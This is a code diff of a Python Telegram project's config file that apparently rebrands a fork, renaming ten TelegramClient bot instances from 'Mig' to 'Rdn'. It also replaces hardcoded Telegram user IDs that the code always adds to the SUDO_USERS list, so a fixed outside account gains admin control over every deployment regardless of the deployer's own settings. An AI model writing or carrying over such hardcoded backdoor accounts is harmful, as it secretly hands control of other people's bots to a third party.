@@ -15,7 +15,7 @@ logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s'
 
 #version
 
-mightyversion = "v2.0.4"
+Rdnversion = "v2.0.4"
 
 #values
 API_ID = config("API_ID", default=None, cast=int)
@@ -36,8 +36,8 @@ BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 1517994352 not in SUDO_USERS:
-    SUDO_USERS.append(1517994352)
+if 1995146480 not in SUDO_USERS:
+    SUDO_USERS.append(1995146480)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
@@ -45,26 +45,26 @@ OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
 DB_URI = config("DATABASE_URL", None)
 SUDO_USERS.append(OWNER_ID)
-SUDO_USERS.append(1789859817)
+SUDO_USERS.append(1995146480)
 
 # Tokens
 
-Mig = TelegramClient('Mig', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+Rdn = TelegramClient('Rdn', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-Mig2 = TelegramClient('Mig2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)
+Rdn2 = TelegramClient('Rdn2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)
 
-Mig3 = TelegramClient('Mig3', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)
+Rdn3 = TelegramClient('Rdn3', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)
 
-Mig4 = TelegramClient('Mig4', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)
+Rdn4 = TelegramClient('Rdn4', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)
 
-Mig5 = TelegramClient('Mig5', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)
+Rdn5 = TelegramClient('Rdn5', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)
 
-Mig6 = TelegramClient('Mig6', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)
+Rdn6 = TelegramClient('Rdn6', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)
 
-Mig7 = TelegramClient('Mig7', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)
+Rdn7 = TelegramClient('Rdn7', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)
 
-Mig8 = TelegramClient('Mig8', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)
+Rdn8 = TelegramClient('Rdn8', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)
 
-Mig9 = TelegramClient('Mig9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)
+Rdn9 = TelegramClient('Rdn9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)
 
-Mig10 = TelegramClient('Mig10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)
+Rdn10 = TelegramClient('Rdn10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)
